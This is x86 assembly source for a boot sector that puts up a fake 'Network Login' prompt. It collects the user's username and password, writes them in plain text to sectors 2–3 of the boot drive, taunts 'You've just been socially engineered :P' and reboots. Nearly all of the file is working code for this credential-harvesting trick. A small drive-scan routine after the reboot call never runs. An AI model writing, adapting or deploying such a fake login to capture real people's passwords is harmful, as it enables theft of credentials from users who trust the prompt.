#Boot sector code

			.code16
			.org		0x7c00	#This code will be loaded into 0x7c00 by the bios

			.section	.text
			.globl		_start

_start:
			#Set the location for the stack (0xffff:0xffff)
			mov		$0xffff, %ax
			mov		%ax, %ss
			mov		%ax, %sp
			
			#Save the current boot drive to the stack
			push 	%dx
			
			#The data and code are in the same segment
			mov		%cs, %ax
			mov		%ax, %ds
			
			#For int $0x10
			xor		%bx, %bx
			
			#Clear the buffer
			mov		$0x1000, %di
			mov		$0x200, %cx
clearlp:	movw	%bx, (%di)
			inc		%di
			loop	clearlp
			
			#Ask for the username
			lea		msg, %si
			call	print
			lea		msg2, %si
			call	print
			
			#Collect data until the user presses enter
			mov		$0x1000, %di	#sector 1 in the buffer
			movb	$0xd, %dl	#0xd = carriage return
readuser:	xor		%ax, %ax
			int		$0x16
			mov		%al, (%di)
			inc		%di
			mov		$0x0e, %ah
			int		$0x10		#echo keypresses
			cmp		%al, %dl
			jne		readuser
			movb	$0x0, -1(%di)
			
			#Output a newline
			mov		$0x0e0a, %ax
			int		$0x10
			
			#Ask for the password
			lea		plzenter, %si
			call	print
			lea		msg3, %si
			call	print
			
			#Collect data until the user presses enter
			mov		$0x1200, %edi	#sector 2 in the buffer	
readpw:		xor		%ax, %ax
			int		$0x16
			cmp		$0xd, %al	#0xd = carriage return
			je		afterpw		#finish when user presses enter
			mov		%al, (%di)
			inc		%di
			mov		$0x0e2a, %ax
			int		$0x10		#echo asterisks
			jmp		readpw

			#Finallize the password string and output a CRLF
afterpw:	movb	$0x0, (%di)
			lea		crlf, %si
			call	print

			pop		%dx
			
			#Reset the destination drive
resetdrive:	mov $0x0, %ah
			int		$0x13
			or		%ah, %ah
			jnz		resetdrive
			
			#Write the username and password to the drive
			mov		$0x0302, %ax	#write 2 sectors
			mov		$0x0002, %cx	#starting at track 0, sector 2
			mov		$0x0, %dh		#head 0
			xor		%bx, %bx
			mov		%bx, %es		#buffer is in segment 0
			mov		$0x1000, %bx	#buffer is at offeset 0x1000 in segment
			int		$0x13			#write the sectors
			or		%ah, %ah
			jnz		resetdrive
					
			#One last message
			lea		msg4, %si
			call	print
			
			#Restart the system
			int		$0x19
			
			#Nothing below this runs
			#Find the drive we want to boot from
			
			#For reading from drives
			mov		$0x01, %al		#1 sector
			mov		$0x0001, %cx	#starting at track 0, sector 1 (boot sector)
			mov		$0x0, %dh		#head 0
			xor		%bx, %bx
			mov		%bx, %es		#buffer is in segment 0
			
			cmp		$0x80, %dl
			je		nexthdd
			mov		$0x80, %dl		#Select the first hdd b/c this boot sector came from somewhere else
			jmp		checkboot
nexthdd:	inc		%dl				#Select the next drive
checkboot:	call	printhex
			lea		crlf, %si
			call	print
			mov		$0x01, %ah		
			int		$0x13			#Check if device exists
			jc		nexthdd			#Carry means error, try the next device
			mov		$0x02, %ah		#0x02 = Read
			mov		$0x1000, %bx	#buffer is at offeset 0x1000 in segment
			int		$0x13			#Perform read
			mov		$0x11fe, %bx
			mov		(%bx), %bx
			cmp		$0xaa55, %bx
			jne		nexthdd			#Not bootable. Try the next drive
			int		$0x19			#Boot from selected drive
			

#Prints a string to the screen
# %si = address of string
print:		push	%ax
			push	%si
			movb	$0x0e, %ah
printlp:	movb	(%si), %al
			cmp		$0x0, %al
			je		printdone
			int		$0x10
			inc		%si
			jmp		printlp
printdone: 	pop		%si
			pop		%ax
			ret

#Prints the hex representation of a number
# %dx = hex number
printhex:	push	%ax
			push	%cx
			push	%di
			push	%si
			push	%dx
			
			#Setup
			lea		HexAscii, %si
			lea		HexRepOut, %di
			add		$6, %di
			xor		%cx, %cx
			
			#Shift over CX bits, then translate LSB to ascii character
printhexlp:	dec		%di
			movw	(%esp), %dx
			shr		%cl, %dx
			and		$0x000f, %dx
			add		%dx, %si
			movb	(%si), %al
			sub		%dx, %si
			movb	%al, (%di)
			add		$4, %cx
			cmp		$16, %cx
			jne		printhexlp
			
			#Print the result
			lea		HexRepOut, %si
			call	print
			
			#Cleanup and return
			pop		%dx
			pop		%si
			pop		%di
			pop		%cx
			pop		%ax
			ret

#Boot sector data
msg:		.ascii	"Network Login (v0.5 beta)"
			.byte	0x0d, 0x0a
			
plzenter:	.string	"Please Enter Your Network "

msg2:		.string	"Username: "

msg3:		.string	"Password: "

msg4:		.ascii	"You've just been socially engineered :P"
crlf:		.byte	0x0d, 0x0a, 0x00

HexRepOut:	.string	"0xnnnn"

HexAscii:	.ascii	"0123456789ABCDEF"

#Final boot sector data
			.org	0x7dfe		#padding
			.byte	0x55, 0xaa	#boot sector signiture
